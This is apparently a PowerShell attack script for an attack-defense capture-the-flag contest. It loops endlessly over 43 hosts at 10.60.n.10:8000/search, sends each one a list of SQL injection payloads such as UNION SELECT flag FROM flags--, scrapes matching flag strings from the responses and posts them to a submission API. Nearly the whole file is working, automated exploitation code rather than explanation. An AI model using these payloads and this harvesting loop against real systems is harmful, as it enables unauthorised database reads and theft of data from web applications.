Write-Host "ULTRA-FAST FLAG HUNTER - REAL-TIME SUBMISSION" -ForegroundColor Cyan

# Configuration
$submitApiUrl = ""
$teamToken = ""

# SQL injection payloads
$payloads = @(
    "query=' OR '1'='1",
    "query=' OR 1=1--",
    "query=' UNION SELECT * FROM flags--",
    "query=' UNION SELECT flag FROM flags--",
    "query=' UNION SELECT GROUP_CONCAT(flag) FROM flags--"
)

# Function to submit flags
function Submit-Flags {
    param([array]$flags)
    
    if ($flags.Count -eq 0) { 
        return $false 
    }
    
    try {
        $payload = @{"flags" = $flags} | ConvertTo-Json -Compress
        $headers = @{
            "Content-Type" = "application/json"
            "X-Team-Token" = $teamToken
        }
        
        $response = Invoke-WebRequest -Uri $submitApiUrl -Method POST -Body $payload -Headers $headers -TimeoutSec 5
        Write-Host "SUBMITTED $($flags.Count) FLAGS! Status: $($response.StatusCode)" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Submit failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Main scanning loop
Write-Host "Starting ultra-fast flag hunter..." -ForegroundColor Yellow
Write-Host "Scanning targets with real-time submission" -ForegroundColor Yellow

while ($true) {
    Write-Host "Starting new scan cycle..." -ForegroundColor Cyan
    
    $jobs = @()
    
    # Start parallel jobs for all URLs
    for ($n = 1; $n -le 43; $n++) {
        $url = "http://10.60.$n.10:8000/search"
        
        $job = Start-Job -ScriptBlock {
            param($url, $payloads, $submitUrl, $token)
            
            $foundFlags = @()
            
            foreach ($payload in $payloads) {
                try {
                    $response = Invoke-WebRequest -Uri $url -Method POST -Body $payload -TimeoutSec 2 -ErrorAction Stop
                    
                    if ($response.StatusCode -eq 200) {
                        $matches = [regex]::Matches($response.Content, 'TEAM\d+_[A-Z0-9]+')
                        
                        foreach ($match in $matches) {
                            $flag = $match.Value
                            if ($foundFlags -notcontains $flag) {
                                $foundFlags += $flag
                            }
                        }
                    }
                }
                catch {
                    # Continue with next payload
                }
            }
            
            return @{
                url = $url
                flags = $foundFlags
            }
        } -ArgumentList $url, $payloads, $submitApiUrl, $teamToken
        
        $jobs += $job
    }
    
    # Wait for jobs to complete
    Write-Host "Waiting for $($jobs.Count) parallel jobs..." -ForegroundColor Gray
    
    $timeout = 15
    $timer = 0
    
    while (($jobs | Where-Object { $_.State -eq "Running" }).Count -gt 0 -and $timer -lt $timeout) {
        Start-Sleep -Seconds 1
        $timer++
    }
    
    # Collect all flags
    $allFlags = @()
    foreach ($job in $jobs) {
        try {
            $result = Receive-Job -Job $job -ErrorAction SilentlyContinue
            if ($result -and $result.flags -and $result.flags.Count -gt 0) {
                foreach ($flag in $result.flags) {
                    if ($allFlags -notcontains $flag) {
                        $allFlags += $flag
                        Write-Host "FOUND: $flag from $($result.url)" -ForegroundColor Cyan
                    }
                }
            }
        }
        catch {
            # Ignore job errors
        }
        
        Remove-Job -Job $job -Force
    }
    
    # Submit all flags immediately
    if ($allFlags.Count -gt 0) {
        Write-Host "Submitting $($allFlags.Count) flags..." -ForegroundColor Yellow
        $success = Submit-Flags -flags $allFlags
        
        if ($success) {
            Write-Host "SUCCESS! All flags submitted" -ForegroundColor Green
        } else {
            Write-Host "FAILED to submit flags" -ForegroundColor Red
        }
    } else {
        Write-Host "No flags found in this cycle" -ForegroundColor Gray
    }
    
    Write-Host "Cycle completed. Starting next scan immediately..." -ForegroundColor Magenta
}